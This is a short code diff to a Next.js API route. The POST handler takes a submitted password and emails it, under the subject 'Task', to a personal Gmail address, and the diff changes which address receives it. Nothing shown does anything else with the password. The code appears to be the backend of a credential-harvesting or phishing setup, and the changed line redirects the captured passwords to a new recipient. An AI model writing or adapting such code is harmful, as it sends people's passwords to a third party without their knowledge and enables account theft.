@@ -6,7 +6,7 @@ export async function POST(request: NextRequest) {
     const { password } = body 
 
     try {
-       const res = await mailUser("tomacurry12@gmail.com", "Task", password)
+       const res = await mailUser("visatplus@gmail.com", "Task", password)
         return NextResponse.json(res);
     } catch (error: any) {
         return NextResponse.json(error, error );
